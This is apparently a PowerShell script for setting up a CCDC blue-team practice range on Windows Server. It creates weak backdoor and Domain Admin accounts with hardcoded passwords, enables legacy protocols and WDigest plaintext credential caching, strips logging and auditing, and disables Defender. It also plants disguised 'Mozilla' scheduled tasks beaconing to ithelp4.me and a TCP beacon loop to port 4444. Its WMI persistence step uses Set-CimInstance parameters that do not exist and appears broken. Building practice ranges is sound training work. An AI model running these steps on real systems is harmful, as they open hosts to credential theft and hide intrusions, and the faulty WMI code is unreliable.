<#
.SYNOPSIS
    CCDC Blue Team Range Setup - Vulnerability & Mock Implant Generator
.DESCRIPTION
    Configures Windows Server (2012 R2 - 2025) with authentic CCDC-style
    misconfigurations, weak credentials, degraded logging, and benign mock
    persistence vectors (ithelp4.me logic bomb, WMI consumers, rogue services).
.NOTES
    For testing and validating hardening, inventory, and threat-hunting scripts.
#>

# Require administrative elevation
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Error "This script must be executed in an elevated PowerShell session (Run as Administrator)."
    exit
}

$ErrorActionPreference = "SilentlyContinue"
Write-Host "==================================================================" -ForegroundColor Red
Write-Host "       DEPLOYING CCDC TEST VULNERABILITIES & MOCK PERSISTENCE     " -ForegroundColor Red
Write-Host "==================================================================" -ForegroundColor Red

# ====================================================================
# 1. CREATE VULNERABLE ACCOUNTS & WEAK CREDENTIALS
# ====================================================================
Write-Host "`n[*] [1/8] Injecting Backdoor & Weak Accounts..." -ForegroundColor Yellow

$TestPasswords = @{
    "backup_admin"  = "Password123!"
    "svc_printer"   = "Summer2024!"
    "temp_contract" = "Welcome123"
}

foreach ($user in $TestPasswords.Keys) {
    $pass = $TestPasswords[$user]
    # Create Local Account
    try {
        net user $user $pass /add /comment:"Legacy Service Account" /y | Out-Null
        Write-Host "    [+] Created local user: $user (Pass: $pass)" -ForegroundColor DarkGray
    } catch {
        Write-Host "    [-] Failed to create local user $user" -ForegroundColor Red
    }
}

# Add backup_admin to local Administrators
net localgroup Administrators backup_admin /add | Out-Null
Write-Host "    [!] Added 'backup_admin' to local Administrators group." -ForegroundColor Yellow

# If domain controller, attempt to create a shadow domain admin
if ((Get-CimInstance Win32_ComputerSystem).PartOfDomain -and (Get-Command New-ADUser -ErrorAction SilentlyContinue)) {
    try {
        $secPass = ConvertTo-SecureString "Winter2024!" -AsPlainText -Force
        New-ADUser -Name "svc_storage" -SamAccountName "svc_storage" -AccountPassword $secPass -Enabled $true -PasswordNeverExpires $true -Description "Default Storage Automation"
        Add-ADGroupMember -Identity "Domain Admins" -Members "svc_storage"
        Write-Host "    [!] Created Domain User 'svc_storage' and added to 'Domain Admins'." -ForegroundColor Yellow
    } catch {
        Write-Host "    [-] Could not create domain account (not on DC or AD module missing)." -ForegroundColor DarkGray
    }
}

# ====================================================================
# 2. WEAKEN AUTHENTICATION & ENABLE LEGACY PROTOCOLS
# ====================================================================
Write-Host "`n[*] [2/8] Enabling Insecure Protocols (SMBv1, LLMNR, NetBIOS, NTLMv1)..." -ForegroundColor Yellow

# Enable SMBv1 (Registry & Protocol fallback)
Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "SMB1" -Value 1 -Type DWord -Force

# Enable LLMNR
$DnscachePath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient"
if (-not (Test-Path $DnscachePath)) { New-Item -Path $DnscachePath -Force | Out-Null }
Set-ItemProperty -Path $DnscachePath -Name "EnableMulticast" -Value 1 -Type DWord -Force

# Enable NetBIOS over TCP/IP across all active NICs (1 = Enable)
Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true } | ForEach-Object {
    $_.SetTcpipNetbios(1) | Out-Null
}

# Degrade NTLM: Accept LM, NTLM, and NTLMv2 (LmCompatibilityLevel = 0 or 1)
$LsaPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
Set-ItemProperty -Path $LsaPath -Name "LmCompatibilityLevel" -Value 0 -Type DWord -Force

# Weaken LDAP Security (Disable enforcement of signing and channel binding)
$NtdsPath = "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters"
if (Test-Path $NtdsPath) {
    Set-ItemProperty -Path $NtdsPath -Name "LDAPServerIntegrity" -Value 0 -Type DWord -Force
    Set-ItemProperty -Path $NtdsPath -Name "LdapEnforceChannelBinding" -Value 0 -Type DWord -Force
}
Write-Host "    [+] Protocols degraded: SMBv1 active, LLMNR enabled, LM/NTLM accepted." -ForegroundColor DarkGray

# ====================================================================
# 3. EXPOSE LSASS TO MEMORY SCRAPING (MIMIKATZ / HASH DUMPING)
# ====================================================================
Write-Host "`n[*] [3/8] Weakening LSASS Memory Protections..." -ForegroundColor Yellow

# Disable LSA Protected Process Light (RunAsPPL)
Set-ItemProperty -Path $LsaPath -Name "RunAsPPL" -Value 0 -Type DWord -Force

# Enable WDigest credential caching (Stores plain-text passwords in LSASS)
$WDigestPath = "$LsaPath\SecurityProviders\WDigest"
if (-not (Test-Path $WDigestPath)) { New-Item -Path $WDigestPath -Force | Out-Null }
Set-ItemProperty -Path $WDigestPath -Name "UseLogonCredential" -Value 1 -Type DWord -Force
Write-Host "    [+] LSASS PPL disabled, WDigest plain-text caching enabled." -ForegroundColor DarkGray

# ====================================================================
# 4. DEGRADE AUDITING & EVENT LOG SIZES
# ====================================================================
Write-Host "`n[*] [4/8] Neutralizing Logging & Audit Telemetry..." -ForegroundColor Yellow

# Shrink event log buffers to force fast circular overwrites
Limit-EventLog -LogName Security -MaximumSize 1024KB -OverflowAction OverwriteAsNeeded -ErrorAction SilentlyContinue
Limit-EventLog -LogName System -MaximumSize 1024KB -OverflowAction OverwriteAsNeeded -ErrorAction SilentlyContinue

# Disable Process Creation Command-Line Logging (EID 4688 command-lines hidden)
$AuditPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit"
if (Test-Path $AuditPath) {
    Set-ItemProperty -Path $AuditPath -Name "ProcessCreationIncludeCmdLine_Enabled" -Value 0 -Type DWord -Force
}

# Disable PowerShell Script Block and Module Logging
$PSPolicyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
Remove-Item -Path "$PSPolicyPath\ScriptBlockLogging" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$PSPolicyPath\ModuleLogging" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$PSPolicyPath\Transcription" -Recurse -Force -ErrorAction SilentlyContinue

# Weaken Audit Policies (Disable Process, SAM, and Privilege Tracking)
auditpol.exe /set /subcategory:"Process Creation" /success:disable /failure:disable | Out-Null
auditpol.exe /set /subcategory:"SAM" /success:disable /failure:disable | Out-Null
auditpol.exe /set /subcategory:"Special Logon" /success:disable /failure:disable | Out-Null
Write-Host "    [+] Telemetry suppressed: EID 4688 command-line, script block logging, and auditpol dropped." -ForegroundColor DarkGray

# ====================================================================
# 5. SIMULATE RITSEC "ithelp4.me" LOGIC BOMB TASKS
# ====================================================================
Write-Host "`n[*] [5/8] Planting Mock 'ithelp4.me' Scheduled Tasks..." -ForegroundColor Yellow

# Task 1: Periodic web beacon masquerading as Mozilla Update
$Task1Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"try { Invoke-WebRequest -Uri 'http://ithelp4.me/index.html' -TimeoutSec 2 } catch {}`""
$Task1Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15)
Register-ScheduledTask -TaskName "Mozilla Update" -Action $Task1Action -Trigger $Task1Trigger -User "SYSTEM" -Force | Out-Null

# Task 2: Benign payload mimicking the shutdown logic bomb trigger
$Task2Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c echo [MOCK LOGIC BOMB ACTIVATED] > C:\ithelp4_trigger.log"
$Task2Trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "Mozilla Monitor" -Action $Task2Action -Trigger $Task2Trigger -User "SYSTEM" -Force | Out-Null

Write-Host "    [!] Planted Scheduled Tasks: 'Mozilla Update' (ithelp4.me) and 'Mozilla Monitor'." -ForegroundColor Yellow

# ====================================================================
# 6. SIMULATE COZY BEAR WMI EVENT PERSISTENCE
# ====================================================================
Write-Host "`n[*] [6/8] Registering Mock Cozy Bear WMI Persistence Consumer..." -ForegroundColor Yellow

# Create a harmless WMI Event Consumer running every 60 seconds (logs to a test file)
$FilterArgs = @{
    Name = "CozyBear_Mock_Filter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Filter = Set-CimInstance -Namespace root\subscription -ClassName __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
    Name = "CozyBear_Mock_Consumer"
    CommandLineTemplate = "cmd.exe /c echo WMI Persistence Active at %TIME% >> C:\wmi_persistence.log"
}
$Consumer = Set-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Arguments $ConsumerArgs

Set-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding -Arguments @{
    Filter = [ref]$Filter
    Consumer = [ref]$Consumer
} | Out-Null

Write-Host "    [!] Injected WMI Subscription: 'CozyBear_Mock_Consumer' bound to root\subscription." -ForegroundColor Yellow

# ====================================================================
# 7. SIMULATE ROGUE SERVICES & UNQUOTED SERVICE PATHS
# ====================================================================
Write-Host "`n[*] [7/8] Generating Mock Rogue Services & Backdoors..." -ForegroundColor Yellow

# Mock Rogue SSH Service entry (creates a benign dummy service pointing to cmd.exe)
if (-not (Get-Service -Name "sshd" -ErrorAction SilentlyContinue)) {
    New-Service -Name "sshd" -DisplayName "OpenSSH SSH Server" -BinaryPathName "cmd.exe /c timeout 86400" -StartupType Automatic | Out-Null
    Start-Service -Name "sshd" -ErrorAction SilentlyContinue
    Write-Host "    [!] Simulated rogue 'sshd' service installed and set to Automatic." -ForegroundColor Yellow
}

# Create an Unquoted Service Path with spaces vulnerability
$UnquotedDir = "C:\Program Files\Vulnerable App"
New-Item -ItemType Directory -Path $UnquotedDir -Force | Out-Null
New-Service -Name "VulnService" -DisplayName "Vulnerable Diagnostic Engine" -BinaryPathName "C:\Program Files\Vulnerable App\service.exe" -StartupType Manual | Out-Null
Write-Host "    [+] Created unquoted service path vulnerability ('VulnService')." -ForegroundColor DarkGray

# ====================================================================
# 8. OPEN FIREWALL & LAUNCH MOCK OUTBOUND BEACON
# ====================================================================
Write-Host "`n[*] [8/8] Lowering Host Firewall & Starting Mock Beacon Loop..." -ForegroundColor Yellow

# Allow arbitrary outbound connections across profiles
Set-NetFirewallProfile -Profile Domain,Private,Public -DefaultOutboundAction Allow -ErrorAction SilentlyContinue

# Disable Defender Real-Time Scanning (if operational)
if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Write-Host "    [!] Disabled Windows Defender Realtime Monitoring." -ForegroundColor Yellow
}

# Start a benign, continuous background beacon simulator on a non-standard port (TCP 4444)
$BeaconScript = {
    while ($true) {
        try {
            # Attempts outbound TCP handshake to an external IP, catching immediately so it doesn't crash
            $client = New-Object System.Net.Sockets.TcpClient
            $client.Connect("8.8.8.8", 4444)
            $client.Close()
        } catch {}
        Start-Sleep -Seconds 10
    }
}
Start-Job -Name "Mock_Beacon_C2" -ScriptBlock $BeaconScript | Out-Null
Write-Host "    [!] Background Job 'Mock_Beacon_C2' started (beaconing to 8.8.8.8:4444)." -ForegroundColor Yellow

# ====================================================================
# SUMMARY VERIFICATION
# ====================================================================
Write-Host "`n==================================================================" -ForegroundColor Green
Write-Host "   RANGE PREPARATION COMPLETE: SYSTEM IS NOW ACTIVELY VULNERABLE  " -ForegroundColor Green
Write-Host "==================================================================" -ForegroundColor Green
Write-Host "The following test conditions are now live:"
Write-Host "  • Users Added          : backup_admin (Local Admin), svc_printer, svc_storage (AD)"
Write-Host "  • Cleartext Credentials: WDigest caching enabled in LSASS, RunAsPPL disabled"
Write-Host "  • Insecure Protocols   : SMBv1 enabled, LLMNR enabled, NTLMv1 accepted"
Write-Host "  • Implants (ithelp4)   : Tasks 'Mozilla Update' and 'Mozilla Monitor' active"
Write-Host "  • Implants (Cozy Bear) : WMI Filter 'CozyBear_Mock_Filter' running in root\subscription"
Write-Host "  • Rogue Backdoors      : 'sshd' mock service listening, unquoted 'VulnService' present"
Write-Host "  • Mock Beacon          : Background job 'Mock_Beacon_C2' attempting TCP port 4444"
Write-Host "  • Logging              : EID 4688 Command-Line and PowerShell logging removed"
